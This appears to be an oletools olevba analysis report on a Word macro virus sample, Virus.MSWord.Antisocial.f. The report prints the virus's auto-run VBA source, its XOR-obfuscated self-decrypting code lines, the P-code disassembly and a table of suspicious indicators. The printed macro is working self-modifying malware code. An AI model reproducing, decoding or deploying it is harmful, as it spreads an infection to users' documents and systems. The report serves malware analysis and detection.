olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Antisocial.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Antisocial.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
For d = 6 To 28: C$ = "": I = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) Xor f: C$ = C$ & Chr(B$): Next X: A = C$
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: Call ViewVBCode: End Sub
Private Sub ViewVBCode()
'5Juqljkv+Vds`KjwhdiUwjhuq%8%5
'7Hwsnhit)DhianujDhiqbutnhit':'7='Hwsnhit)QnurtWuhsbdsnhi':'7
'2Kd"Omlvj*Lmu+"?"32"Clf"Fc{*Lmu+"?"33"Vjgl"Oqe@mz" MAV33/:2-N[Q"KQ"@NKQQ
'4Mb$Ikjpl,Jks-$9$54$Ej`$@e},Jks-$9$55$Plaj$Aj`
'1Rdu!BL!<!UihrEnbtldou/WCQsnkdbu/WCBnlqnodour/Hudl)0(/BnedLnetmd
'3Pfw#BG#>#B`wjufGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof
'4Wap$JP$9$JkviehPaithepa*RFTvknagp*RFGkitkjajpw*Mpai,5-*Gk`aIk`qha
'2Dmp"f"?"4"Vm"0:8"A&"?"  8"K"?"*AO,Nklgq*f."3++8"Pclfmokxg"Vkogp
'1g!<!Hou)Soe!+!9(!*!0;!Gns!Y!<!0!Un!Mdo)H(;!C%!<!@rb)Lhe)H-!Y-!0((!Yns!g;!B%!<!B%!'!Bis)C%(;!Odyu!Y;!@!<!B
'8\`a{Lgk}emf|&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm&ZmxdikmDafm(l$(*/*(.(n(.(I2(Fmp|(l
'1LB!<!BL/Mhodr)0-!BL/BntouNgMhodr(
'2CF,FgngvgNklgq"3."CF,AmwlvMdNklgq8"CF,CffDpmoQvpkle"OA
'8F\&Lmdm|mDafm{(9$(F\&Kg}f|GnDafm{2(F\&IllNzge[|zafo(EK
'2CavktgFmawoglv,QctgCq"DkngLcog8?CavktgFmawoglv,DwnnLcog
'2Kd"VjkqFmawoglv"?"LmpocnVgorncvg"Vjgl"Glf
'1Hg!Enbtldour/Bntou!?!0!Uido
'5H|v`ic%8%QmlvAjfph`kq+CpiiKdh`
'6@it&HIB&;&7&Ri&Bieskchru(Eishr
'1Hg!Enbtldour/Hudl)ONE(/GtmmO`ld!<!Lxrdmg!Uido!FnUn!Idmmn
'2Ukvj"Fmawoglvq,Kvgo*LMF+,T@Rpmhgav,T@Amormlglvq,Kvgo*3+,AmfgOmfwng
'5+A`i`q`Ilk`v%4)%+FjpkqJcIlk`v?%+DaaCwjhVqwlkb%HF?%@ka%Rlqm
'2Fmawoglvq,Kvgo*LMF+,QctgCq"DkngLcog8?Fmawoglvq,Kvgo*LMF+,DwnnLcog
'8@mddg2(Fmp|(FGL2(Mfl(An
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Antisocial.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15163 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #1:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	LitDI2 0x0006 
' 	LitDI2 0x001C 
' 	For 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St C$ 
' 	BoS 0x0000 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St I 
' Line #2:
' 	Ld I 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	St False 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	Ld I 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld I 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld False 
' 	Xor 
' 	St B$ 
' 	BoS 0x0000 
' 	Ld C$ 
' 	Ld B$ 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C$ 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld C$ 
' 	St A 
' Line #3:
' 	Ld d 
' 	Ld A 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	ArgsCall (Call) ViewVBCode 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub ViewVBCode())
' Line #5:
' 	QuoteRem 0x0000 0x001D "5Juqljkv+Vds`KjwhdiUwjhuq%8%5"
' Line #6:
' 	QuoteRem 0x0000 0x003C "7Hwsnhit)DhianujDhiqbutnhit':'7='Hwsnhit)QnurtWuhsbdsnhi':'7"
' Line #7:
' 	QuoteRem 0x0000 0x0048 "2Kd"Omlvj*Lmu+"?"32"Clf"Fc{*Lmu+"?"33"Vjgl"Oqe@mz" MAV33/:2-N[Q"KQ"@NKQQ"
' Line #8:
' 	QuoteRem 0x0000 0x002E "4Mb$Ikjpl,Jks-$9$54$Ej`$@e},Jks-$9$55$Plaj$Aj`"
' Line #9:
' 	QuoteRem 0x0000 0x0040 "1Rdu!BL!<!UihrEnbtldou/WCQsnkdbu/WCBnlqnodour/Hudl)0(/BnedLnetmd"
' Line #10:
' 	QuoteRem 0x0000 0x0042 "3Pfw#BG#>#B`wjufGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof"
' Line #11:
' 	QuoteRem 0x0000 0x0042 "4Wap$JP$9$JkviehPaithepa*RFTvknagp*RFGkitkjajpw*Mpai,5-*Gk`aIk`qha"
' Line #12:
' 	QuoteRem 0x0000 0x0040 "2Dmp"f"?"4"Vm"0:8"A&"?"  8"K"?"*AO,Nklgq*f."3++8"Pclfmokxg"Vkogp"
' Line #13:
' 	QuoteRem 0x0000 0x006A "1g!<!Hou)Soe!+!9(!*!0;!Gns!Y!<!0!Un!Mdo)H(;!C%!<!@rb)Lhe)H-!Y-!0((!Yns!g;!B%!<!B%!'!Bis)C%(;!Odyu!Y;!@!<!B"
' Line #14:
' 	QuoteRem 0x0000 0x005A "8\`a{Lgk}emf|&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm&ZmxdikmDafm(l$(*/*(.(n(.(I2(Fmp|(l"
' Line #15:
' 	QuoteRem 0x0000 0x0022 "1LB!<!BL/Mhodr)0-!BL/BntouNgMhodr("
' Line #16:
' 	QuoteRem 0x0000 0x0037 "2CF,FgngvgNklgq"3."CF,AmwlvMdNklgq8"CF,CffDpmoQvpkle"OA"
' Line #17:
' 	QuoteRem 0x0000 0x0037 "8F\&Lmdm|mDafm{(9$(F\&Kg}f|GnDafm{2(F\&IllNzge[|zafo(EK"
' Line #18:
' 	QuoteRem 0x0000 0x0038 "2CavktgFmawoglv,QctgCq"DkngLcog8?CavktgFmawoglv,DwnnLcog"
' Line #19:
' 	QuoteRem 0x0000 0x002A "2Kd"VjkqFmawoglv"?"LmpocnVgorncvg"Vjgl"Glf"
' Line #20:
' 	QuoteRem 0x0000 0x001C "1Hg!Enbtldour/Bntou!?!0!Uido"
' Line #21:
' 	QuoteRem 0x0000 0x001F "5H|v`ic%8%QmlvAjfph`kq+CpiiKdh`"
' Line #22:
' 	QuoteRem 0x0000 0x001F "6@it&HIB&;&7&Ri&Bieskchru(Eishr"
' Line #23:
' 	QuoteRem 0x0000 0x0039 "1Hg!Enbtldour/Hudl)ONE(/GtmmO`ld!<!Lxrdmg!Uido!FnUn!Idmmn"
' Line #24:
' 	QuoteRem 0x0000 0x0043 "2Ukvj"Fmawoglvq,Kvgo*LMF+,T@Rpmhgav,T@Amormlglvq,Kvgo*3+,AmfgOmfwng"
' Line #25:
' 	QuoteRem 0x0000 0x003B "5+A`i`q`Ilk`v%4)%+FjpkqJcIlk`v?%+DaaCwjhVqwlkb%HF?%@ka%Rlqm"
' Line #26:
' 	QuoteRem 0x0000 0x0042 "2Fmawoglvq,Kvgo*LMF+,QctgCq"DkngLcog8?Fmawoglvq,Kvgo*LMF+,DwnnLcog"
' Line #27:
' 	QuoteRem 0x0000 0x0018 "8@mddg2(Fmp|(FGL2(Mfl(An"
' Line #28:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |V8%                 |Vjgl                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

